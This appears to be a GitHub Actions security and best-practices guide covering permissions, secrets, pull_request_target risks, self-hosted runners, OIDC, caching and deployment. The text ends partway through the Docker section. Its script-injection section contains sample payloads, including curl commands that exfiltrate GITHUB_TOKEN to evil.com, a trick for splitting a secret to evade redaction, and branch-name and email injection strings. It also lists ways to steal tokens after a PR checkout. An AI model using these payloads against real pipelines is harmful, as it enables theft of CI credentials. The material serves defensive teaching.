# GitHub Actions Best Practices

A comprehensive guide to writing secure, maintainable, and efficient GitHub Actions workflows. Intended for both human and AI consumption.

---

## Table of Contents

1. [Workflow Structure and Organization](#1-workflow-structure-and-organization)
2. [Security Fundamentals](#2-security-fundamentals)
3. [Supply Chain Security](#3-supply-chain-security)
4. [Secrets Management](#4-secrets-management)
5. [GITHUB_TOKEN and Permissions](#5-github_token-and-permissions)
6. [Script Injection Prevention](#6-script-injection-prevention)
7. [Pull Request Security](#7-pull-request-security)
8. [Self-Hosted Runner Security](#8-self-hosted-runner-security)
9. [OIDC and Keyless Authentication](#9-oidc-and-keyless-authentication)
10. [Job Design and Dependencies](#10-job-design-and-dependencies)
11. [Caching Strategies](#11-caching-strategies)
12. [Concurrency Controls](#12-concurrency-controls)
13. [Reusable Workflows and Composite Actions](#13-reusable-workflows-and-composite-actions)
14. [Error Handling and Retries](#14-error-handling-and-retries)
15. [Conditional Execution](#15-conditional-execution)
16. [Environment Variables, Inputs, and Outputs](#16-environment-variables-inputs-and-outputs)
17. [Timeouts and Resource Management](#17-timeouts-and-resource-management)
18. [Artifacts and Data Passing](#18-artifacts-and-data-passing)
19. [Environments and Deployment Gates](#19-environments-and-deployment-gates)
20. [Deployment Strategies](#20-deployment-strategies)
21. [Scheduled Workflows and Cron](#21-scheduled-workflows-and-cron)
22. [Logging and Debugging](#22-logging-and-debugging)
23. [Monorepo and Path-Based Triggering](#23-monorepo-and-path-based-triggering)
24. [Docker and Container Patterns](#24-docker-and-container-patterns)
25. [Release Automation](#25-release-automation)
26. [Cost Optimization](#26-cost-optimization)
27. [Custom Actions Development](#27-custom-actions-development)
28. [Testing Workflows Locally](#28-testing-workflows-locally)
29. [Notifications and Alerting](#29-notifications-and-alerting)
30. [Branch Protection Integration](#30-branch-protection-integration)
31. [Anti-Patterns and Common Mistakes](#31-anti-patterns-and-common-mistakes)
32. [Infrastructure-as-Code Patterns](#32-infrastructure-as-code-patterns)
33. [Platform Limitations and Workarounds](#33-platform-limitations-and-workarounds)
34. [Real-World Incidents](#34-real-world-incidents)
35. [Sources](#35-sources)

---

## 1. Workflow Structure and Organization

### File Organization

- Store all workflows in `.github/workflows/`. Subdirectories are not supported for reusable workflows.
- Split large workflows into focused files: `ci.yml`, `build.yml`, `deploy.yml`, `release.yml`.
- For monorepos, use per-package workflow files (`ci-api.yml`, `ci-web.yml`) that call shared reusable workflows.

### Naming Conventions

- Use lowercase kebab-case for filenames: `deploy-production.yml`, `run-tests.yml`.
- Set a descriptive `name:` at the top of each workflow for the GitHub UI.
- Keep job names unique across all workflows. Duplicate names cause ambiguous status checks and can block PR merges.

### General Structure

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@<full-sha>  # v4
      - run: npm run lint

  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@<full-sha>  # v4
      - run: npm test
```

Every workflow should include: explicit `permissions`, `concurrency` controls, and `timeout-minutes` on every job.

---

## 2. Security Fundamentals

GitHub Actions security rests on several pillars. Violating any one of them can compromise an entire repository or organization.

### The Five Pillars

1. **Least privilege**: Restrict `GITHUB_TOKEN` permissions, environment variable scope, and runner access to the minimum required.
2. **Supply chain integrity**: Pin actions by SHA. Vet third-party actions. Use Dependabot.
3. **Input sanitization**: Never interpolate untrusted input into shell commands.
4. **Secrets hygiene**: Scope secrets narrowly, rotate regularly, never log them.
5. **Runner isolation**: Use ephemeral runners. Never use self-hosted runners for public repos.

### Organizational Controls

- Set the org-level default `GITHUB_TOKEN` permission to read-only (Settings > Actions > Workflow permissions).
- Restrict which actions are allowed: use an allow-list of trusted actions at the org level.
- Add `.github/workflows/` to a `CODEOWNERS` file to require review for all workflow changes.
- Enable Dependabot for action version updates.
- Use the OpenSSF Scorecards action for automated security auditing.

---

## 3. Supply Chain Security

### Pin Actions by Full Commit SHA

Tags can be moved or deleted by maintainers (or compromised accounts), silently changing what code runs. Pinning to a full-length SHA is the only way to use an action as an immutable release.

```yaml
# DO NOT: tag reference (mutable)
uses: actions/checkout@v4

# DO: full SHA pin with version comment
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

GitHub offers repository and organization-level policies to enforce SHA pinning.

### Repojacking

When repository owners delete their accounts, attackers can register the old username and serve malicious action code under the original `owner/action` name. GitHub's 100-clone threshold protection does not apply to Actions because API downloads bypass clone counting.

### Dependabot for Actions

Dependabot creates PRs to update actions when vulnerabilities are found. Limitations:
- Only supports `owner/repo@ref` syntax (not Docker Hub or GHCR URLs).
- Only alerts on semantically-versioned actions, not SHA-pinned ones.
- Does not update locally referenced actions (`./.github/actions/`).

### Vetting Third-Party Actions

Before adopting any marketplace action:

1. Audit the source code for secret handling and network calls.
2. Check for "Verified creator" badge (confirms identity, not code safety).
3. Review maintenance activity, community adoption, and issue responsiveness.
4. Test with valid and invalid inputs to ensure logs don't expose secrets.

Consider forking critical third-party actions into your organization for full control. Prefer inline bash commands over actions for simple operations -- every action is a supply chain dependency.

---

## 4. Secrets Management

### Scope Hierarchy

Secrets exist at three levels: organization, repository, and environment. Use the narrowest scope possible.

### Do

- Create individual secrets for each sensitive value.
- Pass secrets via environment variables, never as command-line arguments:

```yaml
# SECURE: environment variable
- name: Deploy
  env:
    API_KEY: ${{ secrets.API_KEY }}
  run: deploy --token "$API_KEY"
```

- Use `::add-mask::VALUE` for dynamically generated sensitive values:

```yaml
- run: |
    TOKEN=$(generate-token)
    echo "::add-mask::$TOKEN"
    echo "TOKEN=$TOKEN" >> $GITHUB_ENV
```

- Use environment-level secrets for promotion workflows (dev/staging/prod).
- Rotate secrets regularly. Remove unused ones.

### Do Not

- Store structured data (JSON, XML, YAML) as a single secret. GitHub's log redaction requires exact string matches and will leak substrings of structured data.
- Pass secrets as command-line arguments (`run: my-cmd ${{ secrets.TOKEN }}`). Other processes can see arguments via `ps`.
- Reference secrets in `if:` expressions directly. Set them as environment variables first.
- Assume base64-encoded or URL-encoded versions of secrets are automatically redacted. They are not.

### Fork Behavior

Secrets are not passed to runners when a workflow is triggered from a forked repository (except `GITHUB_TOKEN`, which is read-only for fork PRs).

### Large Secrets (>48 KB)

Encrypt with GPG, store the encrypted file in the repo, and decrypt at runtime:

```yaml
- run: |
    gpg --quiet --batch --yes --decrypt \
      --passphrase="$PASSPHRASE" \
      --output secrets.json secrets.json.gpg
  env:
    PASSPHRASE: ${{ secrets.LARGE_SECRET_PASSPHRASE }}
```

---

## 5. GITHUB_TOKEN and Permissions

### Always Declare Explicit Permissions

Set minimum permissions at the workflow level, then expand per-job as needed:

```yaml
# Workflow-level: restrictive default
permissions:
  contents: read

jobs:
  deploy:
    # Job-level: expand only where needed
    permissions:
      contents: read
      pages: write
      id-token: write
    runs-on: ubuntu-latest
```

### Available Permission Scopes

| Scope | Values | Purpose |
|-------|--------|---------|
| `actions` | read/write/none | GitHub Actions management |
| `attestations` | read/write/none | Artifact attestations |
| `checks` | read/write/none | Check runs and suites |
| `contents` | read/write/none | Repository contents |
| `deployments` | read/write/none | Deployments |
| `discussions` | read/write/none | GitHub Discussions |
| `id-token` | write/none | OIDC token requests |
| `issues` | read/write/none | Issues |
| `packages` | read/write/none | GitHub Packages |
| `pages` | read/write/none | GitHub Pages |
| `pull-requests` | read/write/none | Pull requests |
| `security-events` | read/write/none | Code scanning alerts |
| `statuses` | read/write/none | Commit statuses |

### Key Rules

- New repositories default to read-only tokens. Older repos may still have write-all defaults -- verify and change.
- To disable all permissions: `permissions: {}`.
- Fork PRs automatically get minimal privileges: no secret access, read-only token.
- Permissions can only be maintained or reduced through reusable workflow chains, never elevated.

---

## 6. Script Injection Prevention

### How Script Injection Works

When `${{ }}` expressions containing untrusted input appear in `run:` blocks, the expression is evaluated and substituted into a temporary shell script before execution. If an attacker controls the input, they control the script.

### Dangerous Context Fields

Any field that can be set by an external user is dangerous:

- `github.event.issue.title` / `.body`
- `github.event.pull_request.title` / `.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.commits[*].message` / `.author.email`
- `github.event.pull_request.head.ref` / `github.head_ref`
- `github.event.discussion.title` / `.body`
- `github.event.pages[*].page_name`

### Exploit Example

```yaml
# VULNERABLE
- run: |
    title="${{ github.event.issue.title }}"
    echo "$title"
```

Attacker creates an issue titled: `"; curl http://evil.com?t=$GITHUB_TOKEN;#`

The generated script becomes:

```bash
title=""; curl http://evil.com?t=$GITHUB_TOKEN;#"
echo "$title"
```

The token is exfiltrated.

### Mitigation: Environment Variable Indirection

```yaml
# SECURE: value stored in env, not interpolated into script
- name: Check title
  env:
    TITLE: ${{ github.event.issue.title }}
  run: |
    if [[ "$TITLE" =~ ^octocat ]]; then
      echo "Title starts with 'octocat'"
    fi
```

### Mitigation: Use Action Inputs

```yaml
# SECURE: value passed as argument, not shell-expanded
- uses: some-action/check-title@v3
  with:
    title: ${{ github.event.pull_request.title }}
```

### Branch Name Injection

Branch names cannot contain spaces, but attackers work around this: `zzz";echo${IFS}"hello";#`

### Email Address Injection

Valid email addresses can contain backticks: `` `echo${IFS}hello`@domain.com ``

### Secret Exfiltration Bypass Techniques

Even with automatic log redaction, attackers can:

```bash
# Split output to bypass redaction
echo ${SOME_SECRET:0:4}
echo ${SOME_SECRET:4:200}

# HTTP exfiltration
curl http://evil.com?token=$GITHUB_TOKEN
```

### Detection

Use CodeQL queries from GitHub Security Lab:
- `script_injections.ql` -- identifies expression injections
- `pull_request_target.ql` -- flags risky `pull_request_target` patterns

---

## 7. Pull Request Security

### `pull_request` vs `pull_request_target`

| Feature | `pull_request` | `pull_request_target` |
|---------|---------------|----------------------|
| Workflow code runs from | PR head (fork) | Target/base branch |
| Secrets access | None (from forks) | Full repository secrets |
| GITHUB_TOKEN | Read-only | Read/write |
| Safe by default | Yes | No |

### The Critical Danger of `pull_request_target`

`pull_request_target` grants full secrets and a write token while running workflow code from the base branch. The vulnerability occurs when you explicitly checkout the PR's code:

```yaml
# EXTREMELY DANGEROUS
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}
      # Attacker's code now runs with full secrets access
      - run: npm install  # Malicious preinstall hooks execute
        env:
          SECRET: ${{ secrets.DEPLOY_KEY }}
```

### Attack Vectors After Checkout

- Package manager hooks: malicious `preinstall` scripts in `package.json`, `setup.py`, Gradle wrappers
- Binary replacement: swap executables used by later steps
- DNS manipulation: modify `/etc/hosts` or add malicious CA certificates
- Docker image replacement: the `runner` user has Docker group membership
- Action substitution: replace downloaded actions in `/home/runner/work/_actions/`
- Token theft: `git config --get http.https://github.com/.extraheader` extracts the write token

### Rules

- Use `pull_request` (not `pull_request_target`) whenever possible.
- If you must use `pull_request_target`, never checkout PR code.
- If you must checkout PR code in `pull_request_target`, place all privileged operations before the checkout step.
- Require approval for all outside collaborator PRs.

---

## 8. Self-Hosted Runner Security

### The Cardinal Rule

**Never use self-hosted runners for public repositories.** Any user can open a PR and execute arbitrary code on the runner.

### Persistent Compromise

Unlike GitHub-hosted runners (ephemeral VMs destroyed after each job), self-hosted runners can be persistently compromised. Malicious modifications and background processes survive across workflow executions.

### Real-World Case: PyTorch Supply Chain Attack

Researchers demonstrated a critical attack chain on PyTorch:

1. Gained contributor status by fixing a typo in a markdown file.
2. Identified persistent self-hosted runners from workflow logs.
3. Submitted a malicious draft PR targeting self-hosted runners.
4. Installed persistence using "Runner on Runner" technique (a second runner agent registered to their private org).
5. Stole `GITHUB_TOKEN` from `.git/config` during legitimate workflow runs.
6. Deleted evidence using the stolen token via API.
7. Compromised PATs controlling 93+ repositories.
8. Stole AWS credentials for the PyTorch release upload bucket.

### Hardening Self-Hosted Runners

- Use ephemeral/JIT runners that perform at most one job, then auto-remove.
- Run as an unprivileged user without admin/sudo access.
- Use runner groups to limit which repositories can target which runners.
- Implement monitoring (EDR agents, Sysmon, SIEM).
- Minimize stored credentials on the machine.
- Use containers or Kubernetes pods for workload isolation.
- Use Actions Runner Controller (ARC) for Kubernetes-based ephemeral runners at scale.

---

## 9. OIDC and Keyless Authentication

### Why OIDC

OIDC eliminates stored cloud credentials in GitHub. Instead, GitHub generates a short-lived JWT per job, which is exchanged for temporary cloud credentials that expire when the job completes.

### How It Works

1. Configure your cloud provider to trust GitHub's OIDC provider (`token.actions.githubusercontent.com`).
2. GitHub generates a JWT with claims about the workflow (repo, branch, environment, actor).
3. The workflow requests this token with `id-token: write` permission.
4. The cloud provider validates the JWT claims and issues short-lived access credentials.

### Workflow Configuration

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      # AWS
      - uses: aws-actions/configure-aws-credentials@<sha>
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions
          aws-region: us-east-1

      # Azure
      - uses: azure/login@<sha>
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      # GCP
      - uses: google-github-actions/auth@<sha>
        with:
          workload_identity_provider: projects/123/locations/global/workloadIdentityPools/pool/providers/provider
          service_account: sa@project.iam.gserviceaccount.com
```

### Cloud Provider Trust Policies

Lock down trust policies to specific repositories and branches:

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
    },
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
    }
  }
}
```

### Best Practices

- Use specific repository names in subject claims, not wildcards.
- Lock to exact branches when possible.
- Grant minimal IAM permissions to the assumed role.
- Monitor cloud audit logs for unusual role assumption patterns.

---

## 10. Job Design and Dependencies

### Job Dependency Graph

Jobs without `needs` run in parallel by default. Use `needs` only when a job genuinely depends on another's output:

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    steps:
      - run: npm ci

  lint:
    needs: setup
    runs-on: ubuntu-latest

  test:
    needs: setup
    runs-on: ubuntu-latest

  deploy:
    needs: [lint, test]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
```

Run independent jobs (lint, test, security scans) in parallel, then fan in to deploy.

### Matrix Strategies

```yaml
strategy:
  fail-fast: false
  matrix:
    node: [18, 20, 22]
    os: [ubuntu-latest, windows-latest]
    exclude:
      - os: windows-latest
        node: 18
    include:
      - os: macos-latest
        node: 20
```

- Set `fail-fast: false` when you need full coverage reporting across all combinations.
- Use `max-parallel` to avoid overwhelming external services or burning runner minutes.
- Use `exclude` for known-incompatible combinations and `include` for one-off special cases.

### Dynamic Matrices

Generate matrix values from a prior job's output to only test what changed:

```yaml
jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.filter.outputs.changes }}
    steps:
      - uses: dorny/paths-filter@<sha>
        id: filter
        with:
          filters: |
            api:
              - 'packages/api/**'
            web:
              - 'packages/web/**'

  test:
    needs: changes
    strategy:
      matrix:
        package: ${{ fromJson(needs.changes.outputs.packages) }}
```

---

## 11. Caching Strategies

### Dependency Caching

```yaml
- uses: actions/cache@<sha>
  with:
    path: node_modules
    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-node-
```

### Key Rules

- Always hash lockfiles in cache keys (`package-lock.json`, `go.sum`, `requirements.txt`).
- Use `restore-keys` as fallback so a partial cache hit is better than a cold start.
- Many `setup-*` actions have built-in caching (`cache: 'npm'`, `cache: true`). Use them instead of manual `actions/cache` when available.
- Cache only necessary paths. Avoid caching large, frequently changing directories.

### Cache Limits and Behavior

- Cache size can exceed 10 GB per repository (as of November 2025).
- Cache keys have a 512-character limit.
- Caches not accessed for 7 days are automatically evicted.
- Caches are OS-specific by default.
- Anyone with read access (including fork contributors) can access cache contents. Never cache secrets.

### Docker Layer Caching

```yaml
- uses: docker/build-push-action@<sha>
  with:
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

---

## 12. Concurrency Controls

### Basic Pattern

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

When a new run starts in the same group, any pending or in-progress run in that group is cancelled.

### Common Patterns

PR builds (cancel old runs when new commits are pushed):

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

Production deploys (queue, never cancel):

```yaml
concurrency:
  group: deploy-production
  cancel-in-progress: false
```

Conditional cancellation (cancel PRs but not main):

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ startsWith(github.ref, 'refs/pull/') }}
```

### Notes

- `cancel-in-progress` accepts expressions for dynamic logic.
- Concurrency groups work at both workflow and job level.
- Cancellation of a parent workflow cancels child reusable workflows.

---

## 13. Reusable Workflows and Composite Actions

### When to Use Which

| Feature | Composite Actions | Reusable Workflows |
|---------|-------------------|-------------------|
| Scope | Steps within a single job | Entire jobs |
| How called | As a step (`uses:` in steps) | As a job (`uses:` at job level) |
| Runner control | Inherits caller's runner | Each job specifies its own |
| Secrets | Cannot consume directly (pass as inputs) | Native `secrets:` support, plus `secrets: inherit` |
| Nesting | Up to 10 levels | Up to 10 levels (4 of reusable calling reusable) |
| Logging | Single combined log entry | Separate job-level logs |
| Location | Any repo (needs `action.yml`) | `.github/workflows/` only |
| Matrix | Limited (caller controls) | Full support |

**Use reusable workflows** to standardize entire CI/CD pipelines across repos, or when you need different runner types or native secrets handling.

**Use composite actions** to package reusable step sequences (like "setup environment" or "deploy to S3") that run inline within an existing job.

### Reusable Workflow Example

Definition:

```yaml
# .github/workflows/reusable-ci.yml
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: '20'
    secrets:
      npm-token:
        required: true
    outputs:
      build-version:
        value: ${{ jobs.build.outputs.version }}

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with:
          node-version: ${{ inputs.node-version }}
      - run: npm ci
        env:
          NPM_TOKEN: ${{ secrets.npm-token }}
      - id: v
        run: echo "version=$(jq -r .version package.json)" >> $GITHUB_OUTPUT
```

Caller:

```yaml
jobs:
  ci:
    uses: my-org/shared-workflows/.github/workflows/reusable-ci.yml@v1
    with:
      node-version: '22'
    secrets:
      npm-token: ${{ secrets.NPM_TOKEN }}

  deploy:
    needs: ci
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.ci.outputs.build-version }}"
```

### Limits

- 10 levels of nesting, 50 workflow calls per run.
- 25 `workflow_dispatch` inputs (up from 10).
- Cannot use expressions in the `uses` keyword (no dynamic workflow selection).
- In call chains, `secrets: inherit` only passes to the immediate callee.
- Permissions can only be maintained or reduced, never elevated.

---

## 14. Error Handling and Retries

### Step-Level `continue-on-error`

```yaml
- name: Flaky test
  id: integration
  continue-on-error: true
  run: npm run test:integration

- name: Retry if failed
  if: steps.integration.outcome == 'failure'
  run: npm run test:integration
```

Use `steps.<id>.outcome` (raw result) rather than `steps.<id>.conclusion` (adjusted for `continue-on-error`).

### Status Check Functions

- `success()` -- true if no previous step failed (default for `if`).
- `failure()` -- true if any previous step failed.
- `always()` -- always runs, even if cancelled.
- `cancelled()` -- true if the workflow was cancelled.

### Cleanup and Notification Pattern

```yaml
- name: Deploy
  id: deploy
  run: ./deploy.sh

- name: Notify on failure
  if: failure() && steps.deploy.outcome == 'failure'
  run: curl -X POST "$SLACK_WEBHOOK" -d '{"text":"Deploy failed"}'

- name: Cleanup
  if: always()
  run: ./cleanup.sh
```

### Retry with Third-Party Action

```yaml
- uses: nick-fields/retry@<sha>
  with:
    timeout_minutes: 5
    max_attempts: 3
    retry_wait_seconds: 10
    command: npm run test:e2e
```

---

## 15. Conditional Execution

### Path-Based Filtering

```yaml
on:
  push:
    paths-ignore:
      - '**.md'
      - 'docs/**'
      - '.github/ISSUE_TEMPLATE/**'
```

### Job-Level Conditions

```yaml
jobs:
  deploy:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
```

### Step-Level Conditions

```yaml
- name: Publish
  if: startsWith(github.ref, 'refs/tags/v')
  run: npm publish
```

### Common Expression Patterns

- `github.actor != 'dependabot[bot]'` -- skip for bot PRs.
- `contains(github.event.head_commit.message, '[skip ci]')` -- manual skip.
- `github.event.pull_request.draft == false` -- skip draft PRs.
- `!cancelled()` -- run unless workflow was explicitly cancelled.

---

## 16. Environment Variables, Inputs, and Outputs

### Scope Hierarchy (Narrowest Is Best)

```yaml
env:                          # Workflow-level (avoid unless truly global)
  CI: true

jobs:
  build:
    env:                      # Job-level
      NODE_ENV: production
    steps:
      - name: Deploy
        env:                  # Step-level (preferred for most cases)
          API_KEY: ${{ secrets.API_KEY }}
        run: ./deploy.sh
```

Declare environment variables at the narrowest possible scope. This limits exposure to compromised steps and makes individual steps easier to reason about.

### Passing Data Between Steps

`$GITHUB_OUTPUT` for outputs:

```yaml
- id: meta
  run: echo "sha_short=$(git rev-parse --short HEAD)" >> $GITHUB_OUTPUT
- run: echo "Short SHA is ${{ steps.meta.outputs.sha_short }}"
```

`$GITHUB_ENV` for environment variables:

```yaml
- run: echo "BUILD_DATE=$(date -u +%Y-%m-%d)" >> $GITHUB_ENV
- run: echo "Build date is $BUILD_DATE"
```

### Inputs for Reusable Workflows and `workflow_dispatch`

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options: [development, staging, production]
      version:
        description: 'Version to deploy'
        required: true
        type: string
      dry-run:
        type: boolean
        default: false
```

Access via `${{ inputs.name }}` in reusable workflows, `${{ github.event.inputs.name }}` in dispatch workflows.

---

## 17. Timeouts and Resource Management

### Always Set Timeouts

The default timeout is 6 hours -- far too long for any normal CI job.

```yaml
jobs:
  test:
    timeout-minutes: 30     # Job-level
    runs-on: ubuntu-latest
    steps:
      - name: Integration tests
        timeout-minutes: 10  # Step-level
        run: npm run test:integration
```

Use 10-15 minutes for most jobs. 30 minutes for heavy builds. Adjust based on observed run times.

### Pin Runner Versions

```yaml
runs-on: ubuntu-22.04   # Not ubuntu-latest
```

`ubuntu-latest` changes without warning when GitHub rolls forward. Pin to a specific version and upgrade deliberately.

### Shallow Clones

```yaml
- uses: actions/checkout@<sha>
  with:
    fetch-depth: 1
```

Saves 30 seconds to 2+ minutes on large repos.

### Sparse Checkout for Monorepos

```yaml
- uses: actions/checkout@<sha>
  with:
    sparse-checkout: |
      packages/api
      packages/shared
      package.json
```

---

## 18. Artifacts and Data Passing

### Sharing Build Outputs Between Jobs

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm run build
      - run: tar -czf build.tar.gz dist/
      - uses: actions/upload-artifact@<sha>
        with:
          name: build
          path: build.tar.gz
          compression-level: 9
          retention-days: 7

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@<sha>
        with:
          name: build
```

### For Small Data, Use Job Outputs Instead

Zero upload/download overhead:

```yaml
jobs:
  version:
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - id: v
        run: echo "version=$(jq -r .version package.json)" >> $GITHUB_OUTPUT
```

### Artifact Security

- Set `retention-days` to control storage costs.
- Use distinct artifact names per matrix combination to avoid collisions.
- Never trust cross-workflow artifacts from forks. Several third-party download actions do not differentiate between artifacts from forked vs. original repositories, enabling artifact poisoning attacks.
- Pin to exact run IDs or commit hashes when downloading artifacts from other workflows.

---

## 19. Environments and Deployment Gates

### Environment Protection Rules

| Protection | Details |
|-----------|---------|
| Required reviewers | Up to 6 people/teams; only 1 approval needed |
| Wait timer | 1 to 43,200 minutes (30 days) |
| Deployment branches/tags | Restrict which refs can deploy |
| Admin bypass | Can be disabled to enforce protections for everyone |
| Custom rules | GitHub Apps can implement specialized logic |

### How Environment Secrets Work

Secrets bound to an environment are only available after all protection rules pass:

```yaml
jobs:
  deploy:
    environment: production  # Triggers protection rules
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}  # Available only after approval
```

### Multi-Environment Promotion

```
dev (auto-deploy) -> staging (optional review) -> production (required reviewers + wait timer)
```

- dev: auto-deploy on push to `develop`, no approval.
- staging: deploy on merge to `main`, optional reviewer.
- production: required reviewers, wait timer, branch restrictions (main only).

Each environment holds its own secrets (API keys, connection strings), preventing cross-environment leakage.

---

## 20. Deployment Strategies

### Blue-Green

Maintain two identical environments. Deploy new version to green, run smoke tests, switch traffic, keep blue for instant rollback. Best for mission-critical apps requiring zero downtime.

### Canary

Progressive traffic shifting with monitoring:

1. Deploy to 5% of traffic.
2. Monitor metrics (latency, error rates).
3. If stable, expand to 25%, 50%, 100%.
4. If issues detected, rollback immediately.

Use staged jobs with environment gates between each percentage increase.

### Rolling

Update instances incrementally. Resource-efficient (no duplicate infrastructure). Best for loosely coupled services.

### GitOps with Kubernetes

1. GitHub Actions builds images and pushes to registries.
2. GitHub Actions updates a GitOps repository with new image tags.
3. Argo CD detects changes and syncs clusters.
4. Argo Rollouts executes blue-green or canary strategies.

---

## 21. Scheduled Workflows and Cron

### Pitfalls

- **Timing is imprecise**: Workflows can run 15-20 minutes late due to global queueing.
- **UTC only**: Cron uses POSIX syntax with UTC times. Calculate your timezone offset.
- **Inactive repos**: GitHub disables scheduled workflows on repos with no recent activity. Push a commit to re-enable.
- **Minimum interval**: 5 minutes.
- **Recognition delay**: GitHub can take 15 minutes to over an hour to pick up new/updated cron schedules.

### Best Practices

```yaml
on:
  schedule:
    - cron: '15 6 * * 1-5'  # Weekdays at 6:15 AM UTC (avoid :00)
  workflow_dispatch: {}       # Always add manual trigger fallback
```

- Avoid peak times (`:00`). Schedule at `:15` or `:45` to reduce contention.
- Stagger multiple scheduled jobs across different times.
- Always add `workflow_dispatch` for manual testing without waiting.

---

## 22. Logging and Debugging

### Debug Logging

Set repository secret/variable `ACTIONS_STEP_DEBUG=true` for detailed step output. Set `ACTIONS_RUNNER_DEBUG=true` for runner-level diagnostics. Or re-run a failed job with "Enable debug logging" in the UI.

### Structured Log Commands

```yaml
- run: |
    echo "::debug::Detailed debug info"
    echo "::notice::Informational notice"
    echo "::warning::Something might be wrong"
    echo "::error::Something is definitely wrong"
    echo "::error file=src/app.ts,line=42,col=5::Null reference"
```

### Log Grouping

```yaml
- run: |
    echo "::group::Install Dependencies"
    npm ci
    echo "::endgroup::"
```

### Job Summaries

Render Markdown in the workflow run summary page:

```yaml
- run: |
    echo "## Test Results" >> $GITHUB_STEP_SUMMARY
    echo "| Suite | Status |" >> $GITHUB_STEP_SUMMARY
    echo "|-------|--------|" >> $GITHUB_STEP_SUMMARY
    echo "| Unit  | Pass   |" >> $GITHUB_STEP_SUMMARY
```

### SSH Debugging (Last Resort)

```yaml
- uses: mxschmitt/action-tmate@<sha>
  if: failure()
```

Opens an SSH session into the runner. Remove before merging.

### Debugging Gotchas

- Secrets are masked in logs. If debug output contains a secret, it becomes `***`.
- A typo like `${{ secrets.MY_SECRT }}` returns an empty string, not an error.
- `if: success()` is the implicit default. Use `if: always()` for cleanup steps.

---

## 23. Monorepo and Path-Based Triggering

### Native Path Filtering

```yaml
on:
  push:
    branches: [main]
    paths:
      - 'packages/api/**'
      - 'libs/shared/**'
      - 'package.json'
```

Limitations: does not apply to `workflow_dispatch` or `schedule` events. Required status checks won't pass if the workflow is skipped entirely.

### Dynamic Change Detection

```yaml
jobs:
  detect:
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
    steps:
      - uses: dorny/paths-filter@<sha>
        id: filter
        with:
          filters: |
            api:
              - 'packages/api/**'
            web:
              - 'packages/web/**'

  build-api:
    needs: detect
    if: needs.detect.outputs.api == 'true'
    runs-on: ubuntu-latest
```

### Required Status Checks with Path Filters

If a workflow uses `paths:` and doesn't run (no relevant files changed), the required status check never reports and the PR is blocked. Solution: use a stub job that always runs:

```yaml
jobs:
  test-status:
    needs: [changes, test]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: |
          if [[ "${{ needs.test.result }}" == "failure" ]]; then
            exit 1
          fi
```

### Build Orchestration

Use Turborepo or Nx for intelligent affected-package builds:

```bash
# Turborepo: only build packages changed since main
pnpm turbo run build --filter='...[origin/main]'

# Nx: parallel affected builds
npx nx affected --target=build --base=origin/main --parallel=3
```

---

## 24. Docker and Container Patterns

### Modern Build Workflow

```yaml
- uses: docker/setup-buildx-action@<sha>
- uses: docker/login-action@<sha>
  with:
    registry: ghcr.io
    username: ${{ github.actor }}
    password: ${{ secrets.GITHUB_TOKEN }}
- uses: docker/metadata-action@<sha>
  id: meta
  with:
    images: ghcr.io/${{ github.repository }}
    tags: |
      type=sha
      type=ref,event=branch
      type=semver,pattern={{version}}
- uses: docker/build-push-action@<sha>
  with:
    push: true
    tags: ${{ steps.meta.outputs.tags }}
    labels: ${{ steps.meta.outputs.labels }}
    cache-from: type=gha
    cache-to: type=gha,mode=max
    provenance: true
    sbom: true
```

### Docker Action Rules

- Do NOT use `USER` in Dockerfiles for actions -- must run as root for `GITHUB_WORKSPACE` access.
- Do NOT use `WORKDIR` for the entrypoint; use absolute paths.
- Use specific image tags (`node:20-alpine`, not `node:latest`).
- Prefer lightweight base images (Alpine) to minimize pull time.
- Include `#!/bin/sh` shebang and `set -e` in entrypoint scripts.

### Container Registry Authentication

